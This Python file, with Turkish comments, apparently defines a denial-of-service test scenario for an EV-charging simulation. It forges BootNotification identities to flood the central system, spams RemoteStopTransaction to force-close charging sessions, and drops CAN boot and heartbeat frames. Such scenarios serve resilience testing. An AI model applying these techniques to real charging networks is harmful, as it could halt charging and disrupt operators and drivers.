from infra.scenario_base import ScenarioHooks


class Scenario(ScenarioHooks):
    """
    Operasyonel Felç (Yaygın DoS) senaryosu.

    Odak:
    - Sahte/botnet kaynaklı BootNotification seli
    - RemoteStopTransaction spam'i ile aktif oturumları zorla kapatma denemesi
    - CAN katmanını düşürerek CSMS'i boğmaya odaklanma
    """

    def __init__(self):
        self.boot_count = 0
        self.remote_stop_count = 0

    def pre_ocpp(self, action, payload):
        if action == "BootNotification":
            self.boot_count += 1
            payload["chargeBoxSerialNumber"] = payload.get(
                "chargeBoxSerialNumber",
                f"dos-bot-{self.boot_count:05d}"
            )
            payload["chargePointSerialNumber"] = payload.get(
                "chargePointSerialNumber",
                f"dos-cp-{self.boot_count:05d}"
            )
            payload["meterSerialNumber"] = payload.get(
                "meterSerialNumber",
                f"meter-dos-{self.boot_count:05d}"
            )
            self.log(
                f"[DoS][BootFlood] #{self.boot_count} sahte boot gonderiliyor "
                f"-> {payload['chargeBoxSerialNumber']}"
            )

        if action == "RemoteStopTransaction":
            self.remote_stop_count += 1
            payload["transactionId"] = payload.get(
                "transactionId",
                f"tx-stop-{self.remote_stop_count:05d}"
            )
            self.log(
                f"[DoS][MassStop] RemoteStopTransaction #{self.remote_stop_count} "
                f"hedef tx={payload['transactionId']}"
            )

        return action, payload

    def post_ocpp(self, action, payload, reply):
        # Kisa cevap ozeti log'lanir (uzun govdeyi keser)
        reply_preview = str(reply)[:120]
        self.log(f"[DoS][OCPP-Reply] action={action} reply={reply_preview}")
        return reply

    def pre_can(self, can_frame):
        # Boot/Heartbeat CAN karelerini dusur -> odak CSMS kaynak tuketimi
        if can_frame and can_frame.get("id") in (0x100, 0x101):
            self.log("[DoS] CAN frame dusuruldu (Boot/Heartbeat) -> CSMS DoS'a odaklan")
            return None
        return can_frame

    def post_can(self, can_frame):
        # MeterValues veya diger CAN akisi varsa kaydet
        self.log(f"[DoS][CAN] Gönderilen frame: {can_frame}")
        return can_frame
